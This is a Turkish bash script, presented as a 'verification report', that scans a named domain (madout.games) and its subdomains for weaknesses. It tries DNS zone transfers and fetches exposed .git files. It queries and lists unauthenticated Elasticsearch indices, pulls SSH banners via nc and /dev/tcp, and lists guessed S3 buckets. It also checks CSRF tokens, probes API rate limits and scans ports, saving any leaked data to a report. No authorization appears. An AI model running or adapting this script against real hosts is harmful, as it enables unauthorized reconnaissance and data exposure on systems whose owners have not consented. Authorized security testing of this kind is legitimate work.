#!/bin/bash
# ============================================
# DOĞRULAMA SCRIPT'İ
# AXFR, .git, Elasticsearch, SSH, S3, CSRF
# Çıktı: dogrulama_raporu.txt
# ============================================

OUT="dogrulama_raporu.txt"
> "$OUT"

echo "========================================" | tee -a "$OUT"
echo "  DOĞRULAMA RAPORU" | tee -a "$OUT"
echo "  Tarih: $(date)" | tee -a "$OUT"
echo "========================================" | tee -a "$OUT"
echo "" | tee -a "$OUT"

# --------------------------------------------
# [1] DNS ZONE TRANSFER (AXFR)
# --------------------------------------------
echo "### [1] DNS ZONE TRANSFER TESTİ ###" | tee -a "$OUT"
for ns in ns1.madout.games ns2.madout.games ns3.madout.games; do
    echo "--- $ns ---" | tee -a "$OUT"
    if command -v dig &> /dev/null; then
        result=$(timeout -s KILL 5 dig axfr @$ns madout.games 2>&1)
        if echo "$result" | grep -q "Transfer failed\|communications error\|timed out\|connection timed out"; then
            echo "[GÜVENLİ] AXFR REDDEDİLDİ ($ns)" | tee -a "$OUT"
        elif [ -n "$result" ] && echo "$result" | grep -q "IN.*SOA"; then
            echo "[!!! AÇIK !!!] AXFR BAŞARILI ($ns) - Zone verisi sızdı!" | tee -a "$OUT"
            echo "$result" | head -20 | tee -a "$OUT"
        else
            echo "[?] Belirsiz yanıt ($ns)" | tee -a "$OUT"
            echo "$result" | head -5 | tee -a "$OUT"
        fi
    else
        echo "[-] dig yok, atlanıyor" | tee -a "$OUT"
    fi
    echo "" | tee -a "$OUT"
done

# --------------------------------------------
# [2] .git EXPOSURE TESTİ
# --------------------------------------------
echo "### [2] .git EXPOSURE TESTİ ###" | tee -a "$OUT"
for host in logs.madout.games tickets.madout.games push.madout.games; do
    echo "--- $host ---" | tee -a "$OUT"

    head_code=$(timeout -s KILL 5 curl -k -s -o /dev/null -w "%{http_code}" "https://$host/.git/HEAD" 2>/dev/null)
    head_body=$(timeout -s KILL 5 curl -k -s "https://$host/.git/HEAD" 2>/dev/null | head -c 200)

    config_code=$(timeout -s KILL 5 curl -k -s -o /dev/null -w "%{http_code}" "https://$host/.git/config" 2>/dev/null)
    config_body=$(timeout -s KILL 5 curl -k -s "https://$host/.git/config" 2>/dev/null | head -c 500)

    echo "  /.git/HEAD   → HTTP $head_code" | tee -a "$OUT"
    echo "  /.git/config → HTTP $config_code" | tee -a "$OUT"

    # Gerçek git içeriği mi?
    if echo "$head_body" | grep -qE "ref:|^[a-f0-9]{40}"; then
        echo "  [!!! AÇIK !!!] .git/HEAD gerçek git referansı döndürüyor!" | tee -a "$OUT"
        echo "  Body: $head_body" | tee -a "$OUT"
    fi
    if echo "$config_body" | grep -qE "\[core\]|repositoryformatversion|\[remote"; then
        echo "  [!!! AÇIK !!!] .git/config gerçek git config döndürüyor!" | tee -a "$OUT"
        echo "  Body:" | tee -a "$OUT"
        echo "$config_body" | tee -a "$OUT"
    fi
    echo "" | tee -a "$OUT"
done

# --------------------------------------------
# [3] ELASTICSEARCH TESTİ
# --------------------------------------------
echo "### [3] ELASTICSEARCH TESTİ (logs:9200) ###" | tee -a "$OUT"

es_root=$(timeout -s KILL 5 curl -k -s "https://logs.madout.games:9200/" 2>/dev/null)
es_root_code=$(timeout -s KILL 5 curl -k -s -o /dev/null -w "%{http_code}" "https://logs.madout.games:9200/" 2>/dev/null)

echo "  / → HTTP $es_root_code" | tee -a "$OUT"
echo "  Body (ilk 500):" | tee -a "$OUT"
echo "$es_root" | head -c 500 | tee -a "$OUT"
echo "" | tee -a "$OUT"

if echo "$es_root" | grep -q '"cluster_name"\|"version"\|"tagline"'; then
    echo "  [!!! AÇIK !!!] Elasticsearch kimlik doğrulama olmadan erişilebilir!" | tee -a "$OUT"

    indices=$(timeout -s KILL 5 curl -k -s "https://logs.madout.games:9200/_cat/indices?v" 2>/dev/null)
    if [ -n "$indices" ]; then
        echo "  --- Index Listesi ---" | tee -a "$OUT"
        echo "$indices" | head -20 | tee -a "$OUT"
    fi
elif [ "$es_root_code" == "401" ]; then
    echo "  [GÜVENLİ] Auth gerekiyor (401)" | tee -a "$OUT"
else
    echo "  [GÜVENLİ] Erişim yok ($es_root_code)" | tee -a "$OUT"
fi
echo "" | tee -a "$OUT"

# --------------------------------------------
# [4] SSH BANNER TESTİ
# --------------------------------------------
echo "### [4] SSH BANNER TESTİ (port 22) ###" | tee -a "$OUT"
for host in logs.madout.games tickets.madout.games push.madout.games; do
    echo "--- $host:22 ---" | tee -a "$OUT"
    banner=$(timeout -s KILL 3 bash -c "echo | nc $host 22" 2>/dev/null || \
             timeout -s KILL 3 bash -c "exec 3<>/dev/tcp/$host/22 && head -1 <&3" 2>/dev/null)
    if [ -n "$banner" ]; then
        echo "  [BİLGİ] SSH Banner: $banner" | tee -a "$OUT"
    else
        echo "  [-] Banner alınamadı" | tee -a "$OUT"
    fi
done
echo "" | tee -a "$OUT"

# --------------------------------------------
# [5] S3 BUCKET TESTİ
# --------------------------------------------
echo "### [5] S3 BUCKET TESTİ ###" | tee -a "$OUT"
for bucket in sentry-backup sentry-files sentry-static sentry-media sentry-data; do
    r=$(timeout -s KILL 5 curl -k -s -o /dev/null -w "%{http_code}" "https://$bucket.s3.amazonaws.com/" 2>/dev/null)
    list_code=$(timeout -s KILL 5 curl -k -s -o /dev/null -w "%{http_code}" "https://$bucket.s3.amazonaws.com/?list-type=2" 2>/dev/null)
    echo "  $bucket → root: $r, list: $list_code" | tee -a "$OUT"

    if [ "$list_code" == "200" ]; then
        echo "  [!!! AÇIK !!!] $bucket LISTELENEBİLİR!" | tee -a "$OUT"
        timeout -s KILL 5 curl -k -s "https://$bucket.s3.amazonaws.com/?list-type=2" 2>/dev/null | head -c 500 | tee -a "$OUT"
        echo "" | tee -a "$OUT"
    fi
done
echo "" | tee -a "$OUT"

# --------------------------------------------
# [6] CSRF + RATE LIMIT TESTİ
# --------------------------------------------
echo "### [6] CSRF + RATE LIMIT TESTİ ###" | tee -a "$OUT"
echo "--- CSRF Token (sentry) ---" | tee -a "$OUT"
login_page=$(timeout -s KILL 5 curl -k -s "https://sentry.madout.games/auth/login/" 2>/dev/null)
if echo "$login_page" | grep -qE 'csrfmiddlewaretoken|csrf-token|_csrf'; then
    token=$(echo "$login_page" | grep -oE 'csrfmiddlewaretoken" value="[^"]+"' | head -1 | cut -d'"' -f3)
    echo "  [GÜVENLİ] CSRF token bulundu: ${token:0:20}..." | tee -a "$OUT"
else
    echo "  [UYARI] CSRF token bulunamadı" | tee -a "$OUT"
fi
echo "" | tee -a "$OUT"

echo "--- Rate Limit Testi (10 hızlı istek) ---" | tee -a "$OUT"
for i in {1..10}; do
    code=$(timeout -s KILL 3 curl -k -s -o /dev/null -w "%{http_code}" "https://sentry.madout.games/api/v1/users" 2>/dev/null)
    echo "  İstek $i → $code" | tee -a "$OUT"
    [ "$code" == "429" ] && echo "  [GÜVENLİ] Rate limit aktif (istek $i'de 429)" | tee -a "$OUT" && break
done
echo "" | tee -a "$OUT"

# --------------------------------------------
# [7] PORT DOĞRULAMA
# --------------------------------------------
echo "### [7] PORT DOĞRULAMA ###" | tee -a "$OUT"
for entry in "logs.madout.games:22" "logs.madout.games:9200" "tickets.madout.games:22" "push.madout.games:22" "push.madout.games:8080" "push.madout.games:8443"; do
    host=$(echo "$entry" | cut -d':' -f1)
    port=$(echo "$entry" | cut -d':' -f2)
    if timeout 3 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null; then
        echo "  [AÇIK] $host:$port" | tee -a "$OUT"
    else
        echo "  [KAPALI] $host:$port" | tee -a "$OUT"
    fi
done
echo "" | tee -a "$OUT"

# --------------------------------------------
# ÖZET
# --------------------------------------------
echo "========================================" | tee -a "$OUT"
echo "  RAPOR TAMAMLANDI" | tee -a "$OUT"
echo "  Dosya: $OUT" | tee -a "$OUT"
echo "  Boyut: $(wc -l < "$OUT") satır" | tee -a "$OUT"
echo "========================================" | tee -a "$OUT"
